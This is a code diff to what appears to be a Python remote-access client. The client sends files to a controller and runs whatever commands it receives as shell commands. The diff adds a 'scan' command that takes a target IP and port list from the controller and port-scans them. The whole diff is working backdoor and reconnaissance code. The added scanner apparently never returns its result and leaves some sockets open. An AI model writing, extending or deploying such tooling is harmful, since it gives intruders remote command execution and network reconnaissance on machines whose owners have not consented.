@@ -38,6 +38,20 @@ $$ |  $$ |\$$$$$$$\ \$$$$$$$ |$$ |  $$ |\$$$$$$$ |$$ |      \$$$$$$$ |
                 packet = f.read(1024)
             s.send('DONE'.encode())
 
+    def scanner(self, s, ip, ports):
+        scan_result = ""
+        for port in ports.split(','):
+            sock = socket.socket()
+            output = sock.connect_ex((ip, int(port)))
+            if output == 0:
+                scan_result = scan_result + "[+]Port " + port + " is OPEN" + "\n"
+                print(scan_result)
+            else:
+                scan_result = scan_result + "[-]Port " + port + " is closed"
+                print(scan_result)
+                sock.close()
+        return scan_result.encode()
+
     def register_signal_handler(self):
         signal.signal(signal.SIGINT, self.quit_gracefully)
         signal.signal(signal.SIGTERM, self.quit_gracefully)
@@ -117,6 +131,10 @@ $$ |  $$ |\$$$$$$$\ \$$$$$$$ |$$ |  $$ |\$$$$$$$ |$$ |      \$$$$$$$ |
                     self.transfer(self.socket, path)
                 except:
                     pass
+            elif data[:4].decode("utf-8") == 'scan':
+                command = data[5:].decode()
+                ip, ports = command.split(':')
+                self.scan_result = self.scanner(self.socket, ip, ports)
             elif len(data) > 0:
                 try:
                     cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
